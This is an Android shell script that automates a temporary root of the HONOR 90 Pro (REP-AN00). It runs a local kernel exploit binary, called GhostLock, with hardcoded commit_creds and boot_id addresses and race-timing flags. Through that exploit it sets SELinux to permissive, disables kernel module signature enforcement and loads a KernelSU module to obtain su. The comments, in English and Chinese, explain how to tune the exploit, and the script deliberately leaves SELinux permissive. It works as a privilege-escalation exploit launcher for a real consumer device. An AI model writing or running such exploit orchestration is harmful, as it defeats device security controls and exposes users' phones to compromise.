#!/system/bin/sh
# One-tap temporary root for HONOR 90 Pro (REP-AN00) via GhostLock + KernelSU LKM.
# Runs as the "shell" user (uid 2000): works from adb, Shizuku, or any on-device
# ADB-privileged terminal. No other device is needed.
D=/data/local/tmp
LOG=$D/run.log
# Link addresses for honor-REP-AN00_9.0.0.230 (runtime = link + KASLR slide).
# The exploit adds the slide and writes COMMIT_CRED_RT/BOOTID_CTL_RT/BOOTID_BUF_RT
# to $KSU_RUNDIR/ksu_runtime.env; without LINK_* it refuses to emit that file
# (anti-blind-write guard), which would abort the loader.
LINK_COMMIT_CRED=${LINK_COMMIT_CRED:-0xffffffc008355258}
LINK_BOOTID_CTL=${LINK_BOOTID_CTL:-0xffffffc00ac4a6c0}
LINK_BOOTID_BUF=${LINK_BOOTID_BUF:-0xffffffc00ae9cedd}
# The exploit emits ksu_runtime.env (link+slide addresses for commit_creds and
# the boot_id ctl/buf) only when both KSU_LOADER and KSU_RUNDIR are set.  Use a
# fresh per-run directory: stray exploit writes must not corrupt old outputs.
# Include $$ because a previous run's files are root-owned and the shell user
# cannot delete that directory on the next attempt.
KSU_RUNDIR=$D/ksu_app_run_$$

dump_diag() {
  for f in $D/enforcing_test.log $D/ksu_load.log $D/loadko.log $D/LOADKO_DONE; do
    [ -f "$f" ] && { echo "--- $f ---"; tail -60 "$f"; }
  done
}

echo "=== GhostLock + KernelSU: temporary root ==="
echo "already rooted? $(/system/bin/su -c id 2>/dev/null | head -1)"

# ---------------------------------------------------------------------------
# 预检：仅两项（开机 >= 60s、可用内存 >= 4GB）。
# 温度/大核频率不再作为门槛：移动处理器自身有限频与温度墙，正常使用下
# 内存水位比温度更能反映“是否适合执行”。拒绝是安全失败（不跑 exploit）。
# ---------------------------------------------------------------------------
TEMP16=$(cat /sys/class/thermal/thermal_zone16/temp 2>/dev/null)
[ -z "$TEMP16" ] && TEMP16=$(cat /sys/class/thermal/thermal_zone0/temp 2>/dev/null)
MEMAV=$(grep MemAvailable /proc/meminfo 2>/dev/null | awk '{print $2}')
UP=$(cut -d. -f1 /proc/uptime 2>/dev/null)
echo "[gate] uptime=${UP}s memavail=${MEMAV}kB temp=${TEMP16}"
if [ -n "$UP" ] && [ "$UP" -lt 60 ]; then
  echo "[!] 开机仅 ${UP}s（需 >= 60s）—— 已在 exploit 运行前中止，设备不会重启。"
  exit 4
fi
if [ -n "$MEMAV" ] && [ "$MEMAV" -lt 4194304 ]; then
  echo "[!] 可用内存仅 $((MEMAV / 1048576))GB（需 >= 4GB）—— 已在 exploit 运行前中止，设备不会重启。"
  exit 4
fi
echo "[gate] OK"

# The module is loaded but SELinux was flipped back: nothing to do.
if lsmod 2>/dev/null | grep -q kernelsu; then
  echo "[*] kernelsu already loaded"
else
  echo "[*] running the exploit (6 carriers, ~15-30s) ..."
  cd $D || exit 1
  rm -f $LOG $D/enforcing_test.log $D/kmsg_cap.txt $D/loadko.log $D/LOADKO_DONE
  mkdir -p "$KSU_RUNDIR" || { echo "[!] cannot create $KSU_RUNDIR"; exit 5; }
  chmod 777 "$KSU_RUNDIR"
  # SLIDE_LITTLECORE=1 : 把竞速线程钉在 0-3 小核。开源注释里这些时序本来就是
  # 按 "shell 被限制在 0-3" 调出来的；本机实际允许 0-7，浮动到大核上会在
  # 大核被限频时直接失配。
  # SLIDE_NOKILL=1     : 失败路径不要 SIGKILL 掉带着损坏 poll_table 的 waiter。
  # SYSCTL_WALK_ATTEMPTS=2: FLIP_SIG 不再只打一次；第一次 miss 后仍有一次机会。
  # KSU_RUNDIR/KSU_LOADER: 让 exploit 生成 ksu_runtime.env，loader 不再用
  #                        硬编码的 -987480 猜 commit_creds。
  ( DURABLE_LOG=$LOG FLIP_PERMISSIVE=1 FLIP_SIG=1 NO_RSCAN=1 \
    AGENT_SCRIPT=$D/load_ksu.sh SYSCTL_WALK_ATTEMPTS=2 SLIDE_SELFCONTAINED=1 \
    KSU_LOADER=1 KSU_RUNDIR=$KSU_RUNDIR \
    LINK_COMMIT_CRED=$LINK_COMMIT_CRED LINK_BOOTID_CTL=$LINK_BOOTID_CTL \
    LINK_BOOTID_BUF=$LINK_BOOTID_BUF \
    SLIDE_SIGNAL_WAKE=1 SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
    SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 SLIDE_LITTLECORE=1 \
    ./exploit_static > /dev/null 2>&1 & )
  # poll: the exploit's forked children keep the session busy, so wait on the log.
  # 同时把 run.log 里已完成的 fire 数（5 个 sysctl 阶段）回显给 App，
  # 让任务单能显示「临时 root（k/5）」的细粒度进度。
  n=0
  f=0
  while [ $n -lt 90 ]; do
    grep -q 'chain complete' $LOG 2>/dev/null && break
    lsmod 2>/dev/null | grep -q kernelsu && break
    c=$(grep -c 'C2 fired-ok' $LOG 2>/dev/null)
    if [ -n "$c" ] && [ "$c" != "$f" ]; then f=$c; echo "[*] exploit stage $f/5"; fi
    sleep 2; n=$((n+1))
  done
  grep -q 'chain complete' $LOG 2>/dev/null && echo "[*] exploit chain complete"
  if ! grep -q 'chain complete' $LOG 2>/dev/null; then
    echo "[!] exploit failed: the carrier race was lost."
    dump_diag
    echo "    The device may reboot; wait ~2 min and run me again."
    exit 2
  fi
fi

echo "[*] waiting for the KSU module ..."
if [ -e /sys/module/module/parameters/sig_enforce ]; then
  SV=$(cat /sys/module/module/parameters/sig_enforce 2>/dev/null)
  case "$SV" in
    N|n|0) : ;;
    *) echo "[!] sig_enforce=$SV — FLIP_SIG did not land; the module will be rejected" ;;
  esac
fi
i=0
while [ $i -lt 60 ]; do
  lsmod 2>/dev/null | grep -q kernelsu && break
  # load_ksu.sh writes LOADKO_DONE on success and on every abort path, so a
  # loader-side failure is surfaced immediately instead of after 120 s.
  [ -f $D/LOADKO_DONE ] && break
  sleep 2; i=$((i+1))
done
if ! lsmod 2>/dev/null | grep -q kernelsu; then
  echo "[!] module did not load"
  dump_diag
  exit 3
fi
echo "[+] kernelsu loaded"

# NOTE: do NOT auto-launch the KernelSU app mid-teardown; the exploit's ctl.data
# restore happens at exit and launching the app then made it crash (libksud reads
# /proc/sys/kernel/random/boot_id).
echo "[*] waiting for /system/bin/su ..."
i=0
while [ $i -lt 10 ]; do
  [ -x /system/bin/su ] && break
  sleep 2; i=$((i+1))
done
if [ ! -x /system/bin/su ]; then
  echo "[*] opening the KernelSU app so it installs su ..."
  am start -n me.weishu.kernelsu/.ui.MainActivity >/dev/null 2>&1
  i=0
  while [ $i -lt 12 ]; do
    [ -x /system/bin/su ] && break
    sleep 2; i=$((i+1))
  done
  [ -x /system/bin/su ] || echo "[!] su still missing — open KernelSU manually, then re-run"
fi
echo "[*] opening KernelSU ..."
am start -n me.weishu.kernelsu/.ui.MainActivity >/dev/null 2>&1

# NOTE: deliberately NOT flipping SELinux back to enforcing here: the KernelSU
# app derives its whole UI state from it (enforcing => shows "not installed").
# 临时 root 到此为止，不再做任何额外操作（HAL/支付/属性都不动）。

echo "=== result ==="
/system/bin/su -c 'id; getenforce' 2>&1 | head -3
